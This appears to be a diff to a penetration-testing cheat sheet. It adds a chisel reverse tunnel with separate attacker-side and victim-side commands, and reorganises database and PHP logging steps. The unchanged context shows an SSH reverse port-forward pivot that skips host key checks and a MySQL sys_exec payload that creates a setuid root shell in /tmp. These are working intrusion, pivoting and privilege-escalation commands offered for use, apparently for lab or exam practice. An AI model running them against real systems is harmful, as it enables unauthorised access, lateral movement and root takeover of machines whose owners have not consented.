@@ -33,10 +33,26 @@ nping –tcp -p 80 -c 4 –flags SYN $target_ip
 nping –tcp-connect -c 1 -p 3389 $target_ip
 ```
 
+## Searching 
+
+```
+grep -rnw /home -e "^.*test.*test.*" -l --color
+```
+
 ## Pivoting 
 
 ```
 ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
+```
+
+Using chisel: <https://github.com/jpillora/chisel>
+- From attacker:
+```
+.\chisel.exe server -p 8000 --reverse
+```
+- From victim:
+```
+.\chisel.exe client 10.10.14.10:8000 R:223:localhost:14147
 ```
 
 ## Docker 
@@ -105,28 +121,39 @@ select * from mysql.func where name='sys_exec' \G
 select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
 ```
 
-Enable logs:
-```
-sudo sed -i "s/#general_log/general_log/g" /etc/mysql/my.cnf 
-sudo sed -i "s/#general_log/general_log/g" /etc/mysql/mysql.conf.d/mysqld.cnf
-sudo sed -i "s/#general_log/general_log/g" /etc/mysql/conf.d/mysqld.cnf
-```
+## Enabling Logs
 
-Restart
-```
-sudo systemctl restart mysql
-```
-
-Tail logs
-```
-sudo tail –f /var/log/mysql/mysql.log
-```
-## postgresql
-
-Enable logs:
-```bash
-echo "log_statement = 'all'" >> postgresql.conf  #none, ddl, mod, all. written to pgsql_log
-```
+- MySQL:
+    ```bash
+    sudo sed -i "s/#general_log/general_log/g" /etc/mysql/my.cnf 
+    sudo sed -i "s/#general_log/general_log/g" /etc/mysql/mysql.conf.d/mysqld.cnf
+    sudo sed -i "s/#general_log/general_log/g" /etc/mysql/conf.d/mysqld.cnf
+    ```
+    ```bash
+    sudo systemctl restart mysql
+    ```
+    ```bash
+    sudo tail -f /var/log/mysql/mysql.log
+    ```
+- PostgreSQL
+    ```bash
+    echo "log_statement = 'all'" >> postgresql.conf  #none, ddl, mod, all. written to pgsql_log
+    ```
+    ```
+    pgsql\data\amdb\pgsql_log\
+    ```
+- PHP
+    ```bash
+    echo "display_errors = On" >> /etc/php5/apache2/php.ini
+    echo "display_errors = On" >> /etc/php6/apache2/php.ini
+    echo "display_errors = On" >> /etc/php7/apache2/php.ini
+    ```
+    ```bash
+    sudo systemctl restart apache2
+    ```
+    ```bash
+    sudo tail -f /var/log/apache2/error.log
+    ```
 
 ## Ping check 
 ```
@@ -173,4 +200,12 @@ def main():
 
 if __name__ == '__main__': 
     main()
+```
+
+## Crypto
+
+Base64 to Hex
+
+```
+echo -n '4as8gqENn26uTs9srvQLyg==' | base64 -D | xxd -p
 ```
